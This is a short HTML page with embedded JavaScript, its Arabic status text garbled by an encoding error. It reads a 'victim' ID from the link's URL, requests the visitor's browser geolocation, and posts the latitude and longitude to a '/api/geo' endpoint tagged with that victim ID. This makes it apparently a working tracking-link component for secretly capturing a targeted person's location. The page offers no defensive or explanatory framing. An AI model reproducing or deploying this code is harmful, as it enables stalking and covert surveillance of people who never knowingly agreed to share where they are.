<!DOCTYPE html>
<html>
<head>
    <title>Geolocation</title>
    <meta charset="UTF-8">
</head>
<body>
    <h2>๐ ุงูุญุตูู ุนูู ุงููููุน...</h2>
    <p id="status">ุฌุงุฑู ุชุญุฏูุฏ ูููุนู...</p>

    <script>
        const params = new URLSearchParams(window.location.search);
        const victimId = params.get("victim");

        if (!victimId) {
            document.getElementById("status").innerText = "โ ูุง ููุฌุฏ Victim ID";
        } else {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        fetch(`/api/geo?victim=${victimId}`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                lat: position.coords.latitude,
                                lon: position.coords.longitude
                            })
                        })
                        .then(res => res.json())
                        .then(data => {
                            document.getElementById("status").innerText = "โ ุชู ุฅุฑุณุงู ุงููููุน!";
                        })
                        .catch(err => {
                            document.getElementById("status").innerText = "โ ุฎุทุฃ ูู ุงูุฅุฑุณุงู";
                        });
                    },
                    error => {
                        document.getElementById("status").innerText = "โ ูุดู ุชุญุฏูุฏ ุงููููุน";
                    }
                );
            } else {
                document.getElementById("status").innerText = "โ ุงููุชุตูุญ ูุง ูุฏุนู ุงููููุน";
            }
        }
    </script>
</body>
</html>
